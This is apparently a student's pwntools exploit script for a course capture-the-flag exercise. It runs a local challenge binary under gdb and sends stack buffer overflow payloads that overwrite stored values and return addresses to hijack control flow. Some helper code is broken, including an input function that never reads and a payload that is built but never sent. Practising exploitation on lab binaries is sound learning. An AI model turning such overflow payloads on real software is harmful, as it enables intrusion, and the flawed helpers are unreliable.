from typing import Any
import pwn

pwn.context.clear(arch="amd64")

p = pwn.process("/home/cubscout61/Current/CS390R/Projects/project2/chall_1/chall")

pwn.gdb.attach(target=p)

main_payload = bytearray()
main_payload += b"a" * 16
main_payload += b"b" * 8
main_payload += pwn.p64(0x40127a)

print(str(p.recvline(), encoding="ascii"))
p.sendline(main_payload)
print(str(main_payload, encoding="ascii"))
print(p.recvline())

def receve_input(proc_pipe):
    print(str(proc_pipe, encoding="ascii"))

def challenge_1():
    receve_input(p)
    c1_payload = bytearray()
    assert len(c1_payload) < 28, "help the payload is too long\nlength: " + str(len(c1_payload))
    c1_payload += b"a" * (28 - len(c1_payload))
    c1_payload += pwn.p32(0xcafebabe)
    c1_payload += pwn.p64(0)
    # padding Return Base Pointer to avoid stack questions
    c1_payload += pwn.p64(0x40121d)
    p.sendline(c1_payload)
    receve_input(p)

def check_2():
    receve_input(p)
    c2_payload = bytearray()
    c2_payload += b"a" * 28
    c2_payload += pwn.p32(0xdeadbeef)
    c2_payload += b"b" * 8
    c2_payload += pwn.p64(0x4012cc)
    receve_input(p)


challenge_1()
check_2()
p.interactive()
